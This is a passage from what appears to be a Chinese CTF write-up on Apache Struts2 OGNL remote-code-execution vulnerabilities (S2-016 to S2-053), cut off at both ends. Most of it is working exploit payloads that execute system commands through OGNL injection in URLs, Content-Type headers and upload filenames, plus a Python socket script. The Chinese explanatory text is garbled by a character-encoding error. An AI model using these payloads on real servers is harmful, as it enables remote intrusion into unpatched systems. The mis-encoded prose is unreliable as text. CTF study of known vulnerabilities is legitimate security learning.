FLAG&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><h1 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h1><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>åœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥â€action:â€ã€â€œredirect:â€ã€â€redirectAction:â€ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤<br>æ‰€ä»¥ï¼Œè®¿é—®<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNLè¡¨è¾¾å¼å³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼</a><br>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15<br>pocï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure><h1 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h1><h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>åŠ¨æ€æ–¹æ³•è°ƒç”¨çš„é»˜è®¤å¯ç”¨ï¼ŒåŸç†ç±»ä¼¼äºs2-008<br>Apache Struts 2çš„â€œDynamic Method Invocationâ€æœºåˆ¶æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»…æé†’ç”¨æˆ·å¦‚æœå¯èƒ½çš„æƒ…å†µä¸‹å…³é—­æ­¤æœºåˆ¶ï¼Œè¿™æ ·å°±å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´åœ¨å—å½±å“åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ä»£ç <br>ä¸s2-008pocåŒºåˆ«ä¸åŒçš„ä»…ä»…æ˜¯ç”±åŸå…ˆçš„[â€œallowStaticMethodAccessâ€]=trueé™æ€æ–¹æ³•æ‰§è¡Œæ”¹ä¸º(new java.lang.ProcessBuilder(â€˜idâ€™)).start()ï¼Œä½†è¯¥æ–¹æ³•åœ¨è™šç©ºæµªå­å¿ƒæå‡ºs2-012åä¸ä¹…å°±åœ¨åšå®¢é‡Œè¯´æ˜äº†å®˜æ–¹ä¿®è¡¥æ–¹æ¡ˆå°†allowStaticMethodAccesså–æ¶ˆäº†åçš„æ›¿è¡¥æ–¹æ³•å°±æ˜¯ä½¿ç”¨ava.lang.ProcessBuilder<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.15.1<br>pocï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#x27;id&#x27;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br><span class="line">// åˆ©ç”¨æ˜¯å…ˆè¿›è¡Œurlç¼–ç     </span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command</span><br><span class="line">&amp;expression=%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%65%6e%76%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%0a</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨é‚£ä¸ªprintenvå°±ä¸è¡Œ</p><h1 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h1><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><p>Strutsæ¡†æ¶è¢«å¼ºåˆ¶æ‰§è¡Œæ—¶ï¼Œå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œå› æ­¤å¯ä»¥ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œå½“ä¸€ä¸ªæ ‡ç­¾çš„å±æ€§å°†è¢«æ¸²æŸ“æ—¶ï¼Œè¯¥å€¼å°†è¢«å†æ¬¡è¯„ä¼°<br>ä¾‹å¦‚ï¼šä»£ç æ‰§è¡Œè¿‡ç¨‹å¤§è‡´ä¸ºå…ˆå°è¯•è·å–valueçš„å€¼ï¼Œå¦‚æœvalueä¸ºç©ºï¼Œé‚£ä¹ˆå°±äºŒæ¬¡è§£é‡Šæ‰§è¡Œäº†nameã€‚å¹¶ä¸”åœ¨æ‰§è¡Œå‰ç»™nameåŠ ä¸Šäº†â€%{}â€ã€‚æœ€ç»ˆé€ æˆäºŒæ¬¡æ‰§è¡Œ<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.24.1ï¼ˆ2.3.20.3é™¤å¤–ï¼‰<br>pocï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure><h1 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h1><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>æ¼æ´åŸç†<br>Struts2åœ¨å¼€å¯äº†åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼ˆDynamic Method Invocationï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨method:<name>çš„æ–¹å¼æ¥è°ƒç”¨åå­—æ˜¯<name>çš„æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åå°†ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è®¡ç®—ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´<br>å½±å“ç‰ˆæœ¬: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>pocï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h1><h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>æ¼æ´åŸç†<br>å½“å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œå¹¶ä¸”åŒæ—¶ä½¿ç”¨äº†Strut2 REST Pluginæ’ä»¶æ—¶ï¼Œä½¿ç”¨â€œ!â€æ“ä½œç¬¦è°ƒç”¨åŠ¨æ€æ–¹æ³•å¯èƒ½æ‰§è¡Œognlè¡¨è¾¾å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œ<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 â€“ Struts 2.3.28 (ä¸åŒ…æ‹¬ 2.3.20.3å’Œ 2.3.24.3)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure><h1 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h1><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>æ¼æ´åŸç†<br>å½“ä½¿ç”¨RESTæ’ä»¶å¯ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¯ä»¥ä¼ é€’å¯ç”¨äºåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„è¡¨è¾¾å¼<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.20 - Struts Struts 2.3.28ï¼ˆ2.3.20.3å’Œ2.3.24.3é™¤å¤–ï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami</span><br></pre></td></tr></table></figure><h1 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h1><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>æ¼æ´åŸç†<br>åœ¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¯¼è‡´ç³»ç»Ÿè¢«é»‘å®¢å…¥ä¾µ<br>æ¶æ„ç”¨æˆ·å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Content-Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 â€“ Struts 2.3.31 Struts 2.5 â€“ Struts 2.5.10</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692543378438-72c29cb1-e05a-4f01-b514-425e311a76a2.png" alt="image.png"></p><h1 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h1><h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>æ¼æ´åŸç†<br>ä¸s2-045ç±»ä¼¼ï¼Œä½†æ˜¯è¾“å…¥ç‚¹åœ¨æ–‡ä»¶ä¸Šä¼ çš„filenameå€¼ä½ç½®ï¼Œå¹¶éœ€è¦ä½¿ç”¨\x00æˆªæ–­<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10<br>è¿™é‡Œwpç”¨çš„æ˜¯ç”¨socketå‘åŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåŒ…æ²¡å¤ªå‘æ˜ç™½ï¼Œè¿‡æ®µæ—¶é—´åœ¨ç ”ç©¶ä¸€ä¸‹ã€‚<br>å·¥å…·ä¸€æŠŠæ¢­ã€‚</p><h1 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h1><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>æ¼æ´åŸç†<br>æ¼æ´ä¸»è¦é—®é¢˜å‡ºåœ¨struts2-struts1-pluginè¿™ä¸ªæ’ä»¶åŒ…ä¸Šã€‚è¿™ä¸ªåº“çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†struts1çš„actionå°è£…æˆstruts2çš„actionä»¥ä¾¿å®ƒèƒ½åœ¨strut2ä¸Šè¿è¡Œä½¿ç”¨<br>è€Œç”±äºstruts2-struts1-plugin åŒ…ä¸­çš„ â€œStruts1Action.javaâ€ ä¸­çš„ execute å‡½æ•°å¯ä»¥è°ƒç”¨ getText() å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆšå¥½åˆèƒ½æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼ŒåŒæ—¶è¿™ä¸ª getText() çš„ å‚æ•°è¾“å…¥ç‚¹ï¼Œåˆå¯ä»¥è¢«ç”¨æˆ·ç›´æ¥è¿›è¡Œæ§åˆ¶ï¼Œå¦‚æœè¿™ä¸ªç‚¹è¢«æ¶æ„æ”»å‡»è€…æ‰€æ§åˆ¶ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„æ‰§è¡Œä»£ç ï¼Œä»è€Œå®ç°ä¸€ä¸ªRCEæ”»å‡»<br>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.32<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692544961840-aeae9959-6449-4b32-9af1-ab5eda4bdcf6.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545103687-b986fa24-bac8-4ea5-9cca-49abb3bad411.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545142685-a66d184c-60e4-43f5-9103-5e0549c8f1df.png" alt="image.png"><br>ä½¬ã®pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠåé¢çš„idæ”¹ä¸ºenvä¼šæŠ¥é”™ï¼Œä½†æ˜¯çœ‹ç€è¿™ä¹ˆçœ¼ç†Ÿï¼Œåƒæ˜¯flagã€‚æäº¤ä¹‹åå‘ç°çœŸæ˜¯å¯¹çš„ï¼š<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545401365-19dcf5d2-9d24-48e5-abfc-36b0079b8602.png" alt="image.png"><br>è¿˜å¯ä»¥ç”¨45çš„content-type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><h1 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h1><h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>æ¼æ´åŸç†<br>Struts2-Rest-Pluginæ˜¯è®©Struts2èƒ½å¤Ÿå®ç°Restful APIçš„ä¸€ä¸ªæ’ä»¶ï¼Œå…¶æ ¹æ®Content-Typeæˆ–URIæ‰©å±•åæ¥åˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„æ•°æ®åŒ…ç±»å‹ï¼Œæœ‰å¦‚ä¸‹æ˜ å°„è¡¨ï¼š</p><table><thead><tr><th>æ‰©å±•å</th><th>Content-Type</th><th>è§£ææ–¹æ³•</th></tr></thead><tbody><tr><td>xml</td><td>application/xml</td><td>xstream</td></tr><tr><td>json</td><td>application/json</td><td>jsonlibæˆ–jackson(å¯é€‰)</td></tr><tr><td>xhtml</td><td>application/xhtml+xml</td><td>æ— </td></tr><tr><td>æ— </td><td>application/x-www-form-urlencoded</td><td>æ— </td></tr><tr><td>æ— </td><td>multipart/form-data</td><td>æ— </td></tr></tbody></table><p>jsonlibæ— æ³•å¼•å…¥ä»»æ„å¯¹è±¡ï¼Œè€Œxstreamåœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å¯ä»¥å¼•å…¥ä»»æ„å¯¹è±¡çš„ï¼ˆé’ˆå¯¹1.5.xä»¥å‰çš„ç‰ˆæœ¬ï¼‰ï¼Œæ–¹æ³•å°±æ˜¯ç›´æ¥é€šè¿‡xmlçš„tag nameæŒ‡å®šéœ€è¦å®ä¾‹åŒ–çš„ç±»åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//æˆ–è€…</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ååºåˆ—åŒ–å¼•å…¥ä»»æ„ç±»é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªåœ¨Struts2åº“ä¸­é€‚ç”¨çš„gedget<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12<br><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md</a><br>å»ºè®®ç›´æ¥å·¥å…·å¯åŠ¨ï¼</p><h1 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h1><h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>æ¼æ´åŸç†<br>Struts2åœ¨ä½¿ç”¨Freemarkeræ¨¡æ¿å¼•æ“çš„æ—¶å€™ï¼ŒåŒæ—¶å…è®¸è§£æOGNLè¡¨è¾¾å¼ã€‚å¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœ¬èº«ä¸ä¼šè¢«OGNLè§£æï¼Œä½†ç”±äºè¢«Freemarkerè§£æä¸€æ¬¡åå˜æˆç¦»å¼€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¢«OGNLè§£æç¬¬äºŒæ¬¡ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´<br>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;printenv | grep 